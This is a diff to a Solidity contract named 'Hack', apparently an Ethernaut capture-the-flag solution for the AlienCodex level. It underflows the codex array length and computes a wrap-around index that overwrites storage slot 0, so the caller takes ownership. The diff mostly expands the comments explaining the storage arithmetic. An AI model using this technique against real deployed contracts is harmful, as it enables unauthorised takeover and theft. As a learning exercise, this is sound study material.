@@ -11,20 +11,29 @@ interface IAlienCodex {
 contract Hack {
     /*
     storage
-    0 - owner
-    0 - contact
-    1 - length of the array codex
+    slot 0 - owner (20 bytes), contact (1 byte)
+    slot 1 - length of the array codex
+
     // slot where array element is stored = keccak256(slot)) + index
+    // h = keccak256(1)
+    slot h + 0 - codex[0] 
+    slot h + 1 - codex[1] 
+    slot h + 2 - codex[2] 
+    slot h + 3 - codex[3] 
+
+    Find i such that
+    slot h + i = slot 0
+    h + i = 0 so i = 0 - h
     */
     constructor(IAlienCodex target) {
         target.make_contact();
         target.retract();
 
-        uint256 s = uint256(keccak256(abi.encode(uint256(1))));
+        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
         uint256 i;
         unchecked {
-            // s + i = 0 = 2**256
-            i -= s;
+            // h + i = 0 = 2**256
+            i -= h;
         }
 
         target.revise(i, bytes32(uint256(uint160(msg.sender))));
